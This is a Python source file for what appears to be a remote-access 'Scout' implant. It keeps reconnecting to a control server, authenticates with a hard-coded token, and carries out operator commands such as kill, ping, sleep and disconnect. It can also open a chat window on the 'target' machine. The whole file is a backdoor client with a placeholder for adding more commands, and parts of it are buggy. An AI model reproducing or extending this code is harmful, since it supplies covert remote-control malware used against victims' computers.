import socket
from time import sleep
import appJar
import time
import threading

def userInterGUI():
    global s,app,old_message,quit
    quit=False
    print('a')
    app=appJar.gui('YOUHAVEAMESSAGE','1000x800')
    app.startPanedFrame("p1")
    app.addLabel("l1", "Your messages")
    app.addScrolledTextArea('msgs')
    app.startPanedFrame("p2")
    app.addLabel("l2", "His messages")
    app.addEmptyMessage('haxmsg')
    app.setMessageWidth('haxmsg',500)
    app.stopPanedFrame()
    app.stopPanedFrame()
    print('b')
    s.sendall('[+]Started GUI on target'.encode())
    old_message=''
    app.registerEvent(updater)
    app.setPollTime('100')
    t=threading.Thread(target=get_data)
    t.start()
    app.go()
def get_data():
    global s,app
    received=''
    try:
        while True:
            time.sleep(0.1)
            data=s.recv(1024).decode()
            if data == 'quit':
                quit=True
                return
            app.queueFunction(app.setMessage, 'haxmsg', data)
    except:
        return
def updater():
    global s,old_message,app,quit
    if quit==True:
        app.stop()
        return
    try:
        this_message=app.getTextArea('msgs')
        if old_message!=this_message:
            old_message=this_message
            s.sendall((this_message).encode())
    except:
        app.stop()


def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
while True:
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect(('127.0.0.1',9999))
            s.sendall('GtQidCjWKpLnZrrEA7wF6kgL3Rh5gtinMmZuxmBbHyrRfi6pru')
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:    
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...')
                quit()
            elif command == 'ping':
                s.sendall('[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...')
                sleep(3)
                break                
#Statements#

            elif command == "interact_user_gui":
                userInterGUI()
            else:
                s.sendall('[-]Please enter a valid command')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments')
